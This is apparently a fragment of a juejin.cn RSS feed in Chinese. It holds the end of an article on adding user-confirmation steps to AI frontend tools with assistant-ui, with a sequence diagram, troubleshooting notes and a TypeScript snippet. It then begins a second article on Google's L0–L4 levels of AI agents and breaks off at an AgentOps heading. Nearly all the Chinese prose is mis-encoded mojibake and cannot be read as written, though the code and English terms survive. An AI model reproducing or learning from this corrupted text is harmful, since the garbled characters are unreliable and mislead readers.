    å‰ç«¯-&gt;&gt;ç”¨æˆ·: æ˜¾ç¤ºç¡®è®¤æ¡†
    ç”¨æˆ·-&gt;&gt;å‰ç«¯: ç‚¹å‡»ç¡®è®¤
    å‰ç«¯-&gt;&gt;å‰ç«¯: resume("confirmed")
    å‰ç«¯-&gt;&gt;åç«¯: å‘é€å·¥å…·ç»“æœ
    åç«¯-&gt;&gt;AI: è½¬å‘ç»“æœ
    AI-&gt;&gt;åç«¯: "å¥½çš„ï¼Œå·²è®°å½•"
    åç«¯--&gt;&gt;å‰ç«¯: è¿”å›å›å¤
    å‰ç«¯-&gt;&gt;ç”¨æˆ·: æ˜¾ç¤ºå®Œæˆ
</code></pre>
<h3 data-id="heading-11">è¸©å‘è®°å½•</h3>
<h4 data-id="heading-12">å‘ 1ï¼š<code>Tool call is not waiting for human input</code></h4>
<p><strong>åŸå› </strong>ï¼šæ²¡åœ¨ <code>execute</code> é‡Œè°ƒç”¨ <code>human()</code>ï¼Œæˆ–è€…åœ¨é”™è¯¯çŠ¶æ€ä¸‹è°ƒç”¨äº† <code>resume()</code></p>
<p><strong>è§£å†³</strong>ï¼šç¡®ä¿ <code>execute</code> é‡Œæœ‰ <code>await human()</code>ï¼Œä¸”åªåœ¨ <code>status.type === "requires-action"</code> æ—¶è°ƒç”¨ <code>resume()</code></p>
<h4 data-id="heading-13">å‘ 2ï¼šå·¥å…·å®Œæˆåæ¶ˆæ¯æ— é™å‘é€</h4>
<p><strong>åŸå› </strong>ï¼š<code>sendAutomaticallyWhen</code> å¯¹åŒä¸€ä¸ªå·¥å…·è°ƒç”¨é‡å¤è¿”å› <code>true</code></p>
<p><strong>è§£å†³</strong>ï¼šç”¨ <code>useRef</code> è®°å½•å·²å¤„ç†çš„ <code>toolCallId</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

<span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
  <span class="hljs-comment">// ... æ‰¾åˆ°å®Œæˆçš„å·¥å…·è°ƒç”¨</span>
  <span class="hljs-keyword">if</span> (!processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolCallId)) {
    processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolCallId);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-14">å‘ 3ï¼šç”¨é”™äº† <code>makeAssistantToolUI</code></h4>
<p><code>makeAssistantToolUI</code> åªæ¸²æŸ“ UIï¼Œä¸ä¼šæŠŠå·¥å…·å®šä¹‰å‘ç»™åç«¯ã€‚å¦‚æœéœ€è¦ AI èƒ½è°ƒç”¨ï¼Œå¿…é¡»ç”¨ <code>makeAssistantTool</code>ã€‚</p>
<h3 data-id="heading-15">æ€»ç»“</h3>
<p>é€šè¿‡ <code>assistant-ui</code> çš„å‰ç«¯å·¥å…·æœºåˆ¶ï¼Œæˆ‘ä»¬å®ç°äº†ï¼š</p>
<ol>
<li><strong>AI èƒ½åŠ›ä¸æ‰“æŠ˜</strong>ï¼šAI ä»ç„¶å¯ä»¥å†³å®šä½•æ—¶è°ƒç”¨å·¥å…·</li>
<li><strong>ç”¨æˆ·æœ‰æ§åˆ¶æƒ</strong>ï¼šæ•æ„Ÿæ“ä½œå¿…é¡»ç»è¿‡ç”¨æˆ·ç¡®è®¤</li>
<li><strong>ä½“éªŒå¾ˆè‡ªç„¶</strong>ï¼šç¡®è®¤æ¡†åµŒå…¥åœ¨å¯¹è¯æµä¸­ï¼Œä¸çªå…€</li>
</ol>
<p>è¿™å¥—æ–¹æ¡ˆå·²ç»åœ¨ç”Ÿäº§ç¯å¢ƒç¨³å®šè¿è¡Œï¼Œç”¨æˆ·å†ä¹Ÿä¸ç”¨æ‹…å¿ƒ AI "æ‰‹æ»‘"äº† ğŸ˜„</p>
<hr/>
<p><strong>æŠ€æœ¯æ ˆ</strong>ï¼šReact + Rust + Tauri + assistant-ui</p>
<p>å¦‚æœä½ ä¹Ÿåœ¨åš AI åº”ç”¨ï¼Œéœ€è¦äººæœºåä½œçš„åœºæ™¯ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼</p>
<p>æ¬¢è¿è¯„è®ºåŒºäº¤æµ ğŸ‘‡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Google Agentè¿›åŒ–è®ºï¼šä» L0 åˆ° L4]]></title>    <link>https://juejin.cn/post/7597276695403102249</link>    <guid>https://juejin.cn/post/7597276695403102249</guid>    <pubDate>2026-01-20T12:09:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695403102249" data-draft-id="7597276695403085865" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Google Agentè¿›åŒ–è®ºï¼šä» L0 åˆ° L4"/> <meta itemprop="keywords" content="Agent,Google,AIGC"/> <meta itemprop="datePublished" content="2026-01-20T12:09:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥‡èˆç²¾é€‰"/> <meta itemprop="url" content="https://juejin.cn/user/4388906147515367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Google Agentè¿›åŒ–è®ºï¼šä» L0 åˆ° L4
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4388906147515367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥‡èˆç²¾é€‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T12:09:01.000Z" title="Tue Jan 20 2026 12:09:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨äººå·¥æ™ºèƒ½çš„æ¼”è¿›å†ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ­£ç»å†ä»â€œé¢„æµ‹å‹ AIâ€å‘ <strong>â€œè‡ªä¸» Agentï¼ˆAutonomous Agentsï¼‰â€</strong> çš„å†å²æ€§è·¨è¶Šã€‚è¿‡å»çš„ AI æ›´åƒæ˜¯è¢«åŠ¨çš„å“åº”è€…ï¼Œå±€é™äºå›ç­”é—®é¢˜æˆ–ç”Ÿæˆå†…å®¹ï¼›è€Œç°åœ¨çš„ Agent åˆ™æ˜¯ä¸€ä¸ªæ‹¥æœ‰æ„ŸçŸ¥ã€å†³ç­–ä¸æ‰§è¡Œèƒ½åŠ›çš„å®Œæ•´ç³»ç»Ÿï¼Œèƒ½å¤Ÿä¸»åŠ¨æ€è€ƒã€è°ƒç”¨å·¥å…·å¹¶é—­ç¯å®Œæˆå¤æ‚ä»»åŠ¡ã€‚</p>
<p>ä¸ºäº†å¸®åŠ©å¼€å‘è€…å’Œäº§å“å†³ç­–è€…å˜æ¸…è¿™ä¸€æ–°ç‰©ç§çš„æŠ€æœ¯è·¯å¾„ï¼ŒGoogle å›¢é˜Ÿå‘å¸ƒäº†æƒå¨æŒ‡å— <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.google.com%2Fresources%2Fcontent%2Fai-agent-handbook" target="_blank" title="https://cloud.google.com/resources/content/ai-agent-handbook" ref="nofollow noopener noreferrer">Introduction to Agents</a></strong>ï¼Œå°† Agent çš„èƒ½åŠ›åˆ’åˆ†ä¸º L0 è‡³ L4 äº”ä¸ªå±‚çº§ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ Agent çš„è§£å‰–å­¦æ¶æ„ï¼šæ¨¡å‹ã€å·¥å…·ä¸ç¼–æ’</h2>
<pre><code class="hljs language-markdown" lang="markdown">è¦ç†è§£ Agent çš„èƒ½åŠ›åˆ†çº§ï¼Œé¦–å…ˆéœ€è¦æ‹†è§£å…¶æ ¸å¿ƒæ¶æ„ã€‚Google å°†ä¸€ä¸ªæ ‡å‡†çš„ Agent ç³»ç»Ÿå®šä¹‰ä¸ºå››ä¸ªæ ¸å¿ƒç»„ä»¶çš„æœ‰æœºç»“åˆï¼š

<span class="hljs-bullet">1.</span>  <span class="hljs-strong">**å¤§è„‘ (The Model)ï¼š**</span> æ ¸å¿ƒæ¨ç†å¼•æ“ã€‚å®ƒè´Ÿè´£ä¿¡æ¯å¤„ç†ã€é€‰é¡¹è¯„ä¼°åŠæœ€ç»ˆå†³ç­–ã€‚æ¨¡å‹çš„æ¨ç†èƒ½åŠ›ç›´æ¥å†³å®šäº† Agent çš„æ™ºå•†ä¸Šé™ã€‚
<span class="hljs-bullet">2.</span>  <span class="hljs-strong">**åŒæ‰‹ (The Tools)ï¼š**</span> è¿æ¥æ•°å­—ä¸ç‰©ç†ä¸–ç•Œçš„æ¡¥æ¢ã€‚é€šè¿‡å·¥å…·ï¼ŒAgent å¯ä»¥è®¿é—®æ—¥å†ã€å‘é€é‚®ä»¶ã€æ£€ç´¢æ•°æ®åº“æˆ–æ‰§è¡Œä»£ç ã€‚æ²¡æœ‰å·¥å…·ï¼ŒAgent ä»…ä»…æ˜¯ä¸€ä¸ªä¸ä¸–éš”ç»çš„èŠå¤©æœºå™¨äººã€‚
<span class="hljs-bullet">3.</span>  <span class="hljs-strong">**ç¥ç»ç³»ç»Ÿ (The Orchestration)ï¼š**</span> ç¼–æ’å±‚ï¼Œå³ Agent çš„â€œç®¡å®¶â€ã€‚å®ƒè´Ÿè´£ç®¡ç† <span class="hljs-strong">**æ€ç»´é“¾ (Chain of Thought)**</span>ã€ç»´æŠ¤ <span class="hljs-strong">**çŠ¶æ€è®°å¿† (State)**</span>ï¼Œå¹¶å†³å®šä½•æ—¶è°ƒç”¨ä½•ç§å·¥å…·ã€‚å®ƒèµ‹äºˆäº† AI è¿è´¯çš„é€»è¾‘ä¸â€œçŸ­æœŸè®°å¿†â€èƒ½åŠ›ã€‚
<span class="hljs-bullet">4.</span>  <span class="hljs-strong">**èº¯ä½“ (Deployment)ï¼š**</span> éƒ¨ç½²ç¯å¢ƒã€‚è¿™ä¸ä»…æŒ‡æœåŠ¡å™¨åŸºç¡€è®¾æ–½ï¼Œè¿˜åŒ…å«è®© Agent èƒ½è¢«ç”¨æˆ·äº¤äº’ã€æˆ–è¢«å…¶ä»– Agent è°ƒç”¨çš„è¿è¡Œæ—¶æ¥å£ã€‚
</code></pre>
<h2 data-id="heading-1">äºŒã€ Agent çš„å·¥ä½œæœºåˆ¶ï¼šè®¤çŸ¥-è¡ŒåŠ¨é—­ç¯</h2>
<p>Agent è§£å†³é—®é¢˜çš„è¿‡ç¨‹å¹¶éå•æ¬¡æ¨ç†ï¼Œè€Œæ˜¯ä¸€ä¸ªåŒ…å«â€œè§‚å¯Ÿ-æ€è€ƒ-ä¿®æ­£â€çš„é€’å½’é—­ç¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8be402dbabb74cd9b64d053d59173e2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=WiqU2Uz0jbG1sNYI67naTvSnS3E%3D" alt="image-20260105171602090" loading="lazy"/></p>
<p><strong>å›¾ 1ï¼šæ™ºèƒ½ä½“è§£å†³é—®é¢˜çš„æ¼æ–—æ¨¡å‹</strong></p>
<p>è¿™ä¸€å¾ªç¯é€šå¸¸åŒ…å«äº”ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li><strong>æ¥æ”¶ä½¿å‘½ (Get the Mission)ï¼š</strong> æ¥æ”¶é«˜å±‚çº§çš„æ¨¡ç³Šç›®æ ‡ï¼Œä¾‹å¦‚ï¼šâ€œå¸®æˆ‘å®‰æ’å›¢é˜Ÿä¸‹å‘¨çš„å‚ä¼šè¡Œç¨‹â€ã€‚</li>
<li><strong>æ‰«æç¯å¢ƒ (Scan the Scene)ï¼š</strong> è·å–ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚Agent ä¼šæ£€ç´¢è®°å¿†ï¼ˆâ€œç”¨æˆ·ä¹‹å‰çš„åå¥½æ˜¯ä»€ä¹ˆï¼Ÿâ€ï¼‰å¹¶æ£€æŸ¥å¯ç”¨èµ„æºï¼ˆâ€œæˆ‘æœ‰å·®æ—…ç³»ç»Ÿçš„æƒé™å—ï¼Ÿâ€ï¼‰ã€‚</li>
<li><strong>æ·±åº¦è§„åˆ’ (Think It Through)ï¼š</strong> åˆ¶å®šå¤šæ­¥éª¤æ‰§è¡Œè®¡åˆ’ã€‚ä¾‹å¦‚ï¼šå…ˆæå–å‚ä¼šåå• -&gt; å†æ ¸å¯¹æ—¥å†ç©ºæ¡£ -&gt; æœ€åæ ¹æ®é¢„ç®—é™åˆ¶é¢„è®¢æœºç¥¨ã€‚</li>
<li><strong>é‡‡å–è¡ŒåŠ¨ (Take Action)ï¼š</strong> æ‰§è¡Œå…·ä½“æ“ä½œã€‚è°ƒç”¨ API æŸ¥è¯¢æ•°æ®åº“ã€è¯»å–æ–‡æ¡£æˆ–å‘é€ç¡®è®¤é‚®ä»¶ã€‚</li>
<li><strong>è§‚å¯Ÿä¸è¿­ä»£ (Observe and Iterate)ï¼š</strong> éªŒè¯æ‰§è¡Œç»“æœã€‚å¦‚æœè®¢ç¥¨å¤±è´¥ï¼ŒAgent ä¼šåˆ†æé”™è¯¯æ—¥å¿—ï¼Œä¿®æ­£å‚æ•°å¹¶é‡æ–°ç”Ÿæˆè®¡åˆ’ï¼Œç›´åˆ°é—­ç¯å®Œæˆã€‚</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€ Agent èƒ½åŠ›åˆ†çº§ï¼šä»å­¤å²›åˆ°è‡ªè¿›åŒ–</h2>
<p>åŸºäºè‡ªä¸»æƒï¼ˆAutonomyï¼‰ä¸åä½œèƒ½åŠ›ï¼ˆCollaborationï¼‰çš„å¼ºå¼±ï¼ŒGoogle å°† Agent çš„è¿›åŒ–è·¯å¾„åˆ’åˆ†ä¸ºäº”å±‚é‡‘å­—å¡”ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a929d3f9fef44a5baf68ff67edb5d04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aWH6Iie57K-6YCJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769515740&amp;x-signature=5yEAlf3tAPiqNr6iM96R2rmYj64%3D" alt="image-20260105171647579" loading="lazy"/></p>
<p><strong>å›¾ 2ï¼šæ™ºèƒ½ä½“è§£å†³é—®é¢˜çš„æ¼æ–—æ¨¡å‹</strong></p>
<h4 data-id="heading-3">Level 0ï¼šæ ¸å¿ƒæ¨ç†ç³»ç»Ÿ (Core Reasoning System)</h4>
<p>è¿™æ˜¯ Agent çš„é›å½¢ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ— å¤–æ¥èƒ½åŠ›çš„â€œè£¸æ¨¡å‹â€ã€‚</p>
<ul>
<li><strong>ç‰¹ç‚¹ï¼š</strong> ä»…ä¾èµ–é¢„è®­ç»ƒæ•°æ®ï¼ˆPre-trained Knowledgeï¼‰è¿›è¡Œé—®ç­”ï¼Œæ— å¤–éƒ¨å·¥å…·è¿æ¥ï¼Œæ— é•¿æœŸçŠ¶æ€è®°å¿†ã€‚</li>
<li><strong>å±€é™ï¼š</strong> å¤„äºâ€œç›²ç›®â€çŠ¶æ€ã€‚å®ƒå¯ä»¥èƒŒè¯µæ£’çƒè§„åˆ™ï¼Œä½†å¦‚æœä½ é—®â€œæ˜¨æ™šæ´‹åŸºé˜Ÿçš„æ¯”åˆ†æ˜¯å¤šå°‘ï¼Ÿâ€ï¼Œå®ƒä¼šå› æ— æ³•è”ç½‘è€Œäº§ç”Ÿå¹»è§‰æˆ–è¡¨ç¤ºæ— èƒ½ä¸ºåŠ›ã€‚</li>
</ul>
<h4 data-id="heading-4">Level 1ï¼šäº’è”å‹é—®é¢˜è§£å†³è€… (Connected Problem-Solver)</h4>
<p>å½“â€œå¤§è„‘â€æ¥é©³äº†â€œåŒæ‰‹â€ï¼ŒçœŸæ­£çš„ Agent è¯ç”Ÿäº†ã€‚</p>
<ul>
<li><strong>ç‰¹ç‚¹ï¼š</strong> å…·å¤‡ <strong>å·¥å…·è°ƒç”¨ (Tool Use)</strong> èƒ½åŠ›ã€‚</li>
<li><strong>è¡¨ç°ï¼š</strong> é¢å¯¹æ¯”åˆ†æŸ¥è¯¢ï¼Œå®ƒä¼šåˆ¤æ–­â€œéœ€è¦æ£€ç´¢å®æ—¶ä¿¡æ¯â€ï¼Œéšå³è°ƒç”¨ Google Search APIï¼Œè·å–ç»“æœå¹¶æ•´åˆæˆç­”æ¡ˆã€‚å®ƒèƒ½è¯»å–å®æ—¶æ–‡æ¡£ã€æŸ¥è¯¢æ•°æ®åº“ï¼Œæ‰“ç ´äº†è®­ç»ƒæ•°æ®çš„æ—¶ç©ºé™åˆ¶ã€‚</li>
</ul>
<h4 data-id="heading-5">Level 2ï¼šç­–ç•¥å‹é—®é¢˜è§£å†³è€… (Strategic Problem-Solver)</h4>
<p>L2 å®ç°äº†ä»â€œè¢«åŠ¨æ‰§è¡Œâ€åˆ°â€œä¸»åŠ¨è§„åˆ’â€çš„è´¨å˜ã€‚</p>
<ul>
<li><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> å…·å¤‡ <strong>ä¸Šä¸‹æ–‡å·¥ç¨‹ (Context Engineering)</strong> ä¸æ¨ç†è§„åˆ’èƒ½åŠ›ã€‚å®ƒèƒ½ç®¡ç†æ³¨æ„åŠ›ç„¦ç‚¹ï¼Œå¤„ç†å¤æ‚çš„å¤šæ­¥éª¤ä»»åŠ¡ã€‚</li>
<li><strong>åœºæ™¯ï¼š</strong> â€œåœ¨å…¬å¸å’Œå®¢æˆ·åŠäº‹å¤„ä¹‹é—´æ‰¾ä¸€å®¶ 4 æ˜Ÿä»¥ä¸Šçš„å’–å•¡é¦†â€ã€‚Agent ä¼šè‡ªåŠ¨æ‹†è§£ä»»åŠ¡ï¼šè®¡ç®—åœ°ç†ä¸­ç‚¹ï¼ˆè°ƒç”¨åœ°å›¾ï¼‰-&gt; æœç´¢å‘¨è¾¹åº—é“ºï¼ˆè°ƒç”¨æœ¬åœ°æœç´¢ï¼‰-&gt; ç­›é€‰è¯„åˆ† -&gt; è¾“å‡ºå»ºè®®ã€‚</li>
</ul>
<h4 data-id="heading-6">Level 3ï¼šåä½œå¼å¤š Agent ç³»ç»Ÿ (Collaborative Multi-Agent)</h4>
<p>æ­¤æ—¶ï¼ŒAgent ä¸å†å•æ‰“ç‹¬æ–—ï¼Œè€Œæ˜¯æ¼”åŒ–ä¸ºâ€œä¸“å®¶å›¢é˜Ÿâ€ã€‚</p>
<ul>
<li><strong>ç‰¹ç‚¹ï¼š</strong> Agent å°†å…¶ä»– Agent è§†ä¸ºå·¥å…·è¿›è¡Œè°ƒåº¦ã€‚</li>
<li><strong>æ¶æ„ï¼š</strong> ç±»ä¼¼ä¼ä¸šç»„ç»‡æ¶æ„ã€‚ä¸€ä¸ªâ€œé¡¹ç›®ç»ç† Agentâ€æ¥æ”¶ä»»åŠ¡ï¼Œå°†å…¶æ‹†è§£å¹¶åˆ†å‘ç»™â€œå¸‚åœºä¸“å®¶ Agentâ€ã€â€œæ–‡æ¡ˆ Agentâ€å’Œâ€œå‰ç«¯å¼€å‘ Agentâ€ã€‚ä¾‹å¦‚æ–°å“å‘å¸ƒä»»åŠ¡ï¼Œå„å­ Agent åˆ†åˆ«è´Ÿè´£è°ƒç ”ã€æ’°ç¨¿å’Œé¡µé¢æ­å»ºï¼Œæœ€åç”±ä¸» Agent éªŒæ”¶æ•´åˆã€‚</li>
</ul>
<h4 data-id="heading-7">Level 4ï¼šè‡ªæˆ‘è¿›åŒ–ç³»ç»Ÿ (Self-Evolving System)</h4>
<p>è¿™æ˜¯ç›®å‰ Agent è¿›åŒ–çš„å·…å³°ï¼šå…·å¤‡ <strong>å…ƒè®¤çŸ¥ (Metacognition)</strong> ä¸è‡ªæˆ‘æ„å»ºèƒ½åŠ›ã€‚</p>
<ul>
<li><strong>ç‰¹ç‚¹ï¼š</strong> å½“ç°æœ‰å·¥å…·æˆ–å›¢é˜Ÿæ— æ³•æ»¡è¶³éœ€æ±‚æ—¶ï¼Œå®ƒèƒ½è‡ªä¸»æ„å»ºæ–°çš„å·¥å…·æˆ– Agentã€‚</li>
<li><strong>è¡¨ç°ï¼š</strong> é¡¹ç›®ç»ç† Agent å‘ç°ç¼ºä¹æƒ…æ„Ÿåˆ†æèƒ½åŠ›ï¼Œå®ƒä¼šè°ƒç”¨â€œAgent Creatorâ€å·¥å…·ï¼Œç°åœºç¼–å†™æç¤ºè¯ä¸é€»è¾‘ï¼Œç”Ÿæˆä¸€ä¸ªâ€œèˆ†æƒ…åˆ†æä¸“å®¶ Agentâ€ï¼Œç»è¿‡è‡ªåŠ¨åŒ–æµ‹è¯•éªŒè¯åï¼Œå°†å…¶çº³å…¥å›¢é˜ŸæŠ•å…¥ç”Ÿäº§ã€‚</li>
</ul>
<h2 data-id="heading-8">å››ã€ å¼€å‘èŒƒå¼è½¬ç§»ï¼šä»â€œæ¬ç –å·¥â€åˆ°â€œå¯¼æ¼”â€</h2>
<p>åœ¨ Agent æ—¶ä»£ï¼Œå¼€å‘è€…çš„è§’è‰²å‘ç”Ÿäº†æ ¹æœ¬æ€§è½¬å˜ã€‚è¿‡å»ï¼Œå¼€å‘è€…æ˜¯â€œæ¬ç –å·¥ï¼ˆBricklayerï¼‰â€ï¼Œéœ€è¦ç¡¬ç¼–ç æ¯ä¸€è¡Œé€»è¾‘ï¼›ç°åœ¨ï¼Œå¼€å‘è€…æ›´åƒæ˜¯ <strong>â€œå¯¼æ¼”ï¼ˆDirectorï¼‰â€</strong>ã€‚</p>
<p><strong>å¯¼æ¼”çš„æ ¸å¿ƒèŒè´£ï¼š</strong></p>
<ul>
<li><strong>è®¾å®šå‰§æœ¬ï¼š</strong> ç¼–å†™æ ¸å¿ƒç³»ç»Ÿæç¤ºè¯ï¼ˆSystem Promptï¼‰å’Œè¡Œä¸ºå®ªæ³•ã€‚</li>
<li><strong>é€‰è§’ï¼š</strong> ä¸º Agent é…ç½®æœ€åˆé€‚çš„å·¥å…·é›†ï¼ˆToolsï¼‰å’Œ API æƒé™ã€‚</li>
<li><strong>èƒŒæ™¯è®¾å®šï¼š</strong> æ³¨å…¥å¿…è¦çš„é¢†åŸŸçŸ¥è¯†åº“ï¼ˆKnowledge Baseï¼‰ã€‚ å‰©ä¸‹çš„æ¼”ç»ï¼Œå°†äº¤ç”±è¿™ä¸ªå…·å¤‡è‡ªä¸»æ€§çš„â€œæ¼”å‘˜â€å»åŠ¨æ€å®Œæˆã€‚</li>
</ul>
<h2 data-id="heading-9">äº”ã€ AgentOpsï¼šæ„å»ºå¯ä¿¡èµ–çš„æ™ºèƒ½ç³»ç»Ÿ</h2>
